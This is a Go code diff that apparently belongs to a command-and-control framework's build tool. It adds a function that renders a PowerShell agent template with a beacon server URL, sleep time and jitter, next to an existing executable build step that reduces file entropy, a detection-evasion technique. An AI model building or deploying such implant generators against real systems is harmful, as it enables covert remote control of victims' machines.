@@ -15,6 +15,7 @@ import (
 	"os/exec"
 	"path/filepath"
 	"strings"
+	texttemplate "text/template"
 )
 
 type BuildConfig struct {
@@ -248,6 +249,58 @@ func BuildEXEStream(cfg BuildConfig, outDir string, progress io.Writer) (string,
 		if err := reduceEntropy(outPath); err != nil {
 			return outPath, fmt.Errorf("entropy reduce: %w", err)
 		}
+	}
+	return outPath, nil
+}
+
+// ── PS1 agent build ───────────────────────────────────────────────────────
+
+// renderPS1Template renders a PS1 agent template with build config vars.
+func renderPS1Template(tmplFile string, cfg BuildConfig) ([]byte, error) {
+	tmplBytes, err := os.ReadFile(tmplFile)
+	if err != nil {
+		return nil, fmt.Errorf("read template %s: %w", tmplFile, err)
+	}
+	sleepSec := 5
+	jitter := 20
+	if cfg.SleepSec > 0 {
+		sleepSec = cfg.SleepSec
+	}
+	if cfg.JitterPct > 0 {
+		jitter = cfg.JitterPct
+	}
+	serverURL := cfg.ServerURL
+	if serverURL == "" {
+		serverURL = "http://127.0.0.1:8080"
+	}
+	t := texttemplate.Must(texttemplate.New("ps1").Parse(string(tmplBytes)))
+	var buf bytes.Buffer
+	if err := t.Execute(&buf, map[string]interface{}{
+		"ServerURL": serverURL,
+		"SleepMs":   sleepSec * 1000,
+		"JitterPct": jitter,
+	}); err != nil {
+		return nil, fmt.Errorf("render ps1: %w", err)
+	}
+	return buf.Bytes(), nil
+}
+
+// BuildPS1Agent renders the PowerShell agent template.
+// Template: agents/agent-ps1/agent.ps1.tmpl
+func BuildPS1Agent(cfg BuildConfig, outDir string) (string, error) {
+	root := projectRoot()
+	outDir = absDir(root, outDir)
+	if err := os.MkdirAll(outDir, 0755); err != nil {
+		return "", fmt.Errorf("mkdir: %w", err)
+	}
+	tmplPath := filepath.Join(root, "agents", "agent-ps1", "agent.ps1.tmpl")
+	data, err := renderPS1Template(tmplPath, cfg)
+	if err != nil {
+		return "", err
+	}
+	outPath := filepath.Join(outDir, resolveOutName(cfg, "agent_http_ps1.ps1"))
+	if err := os.WriteFile(outPath, data, 0644); err != nil {
+		return "", err
 	}
 	return outPath, nil
 }
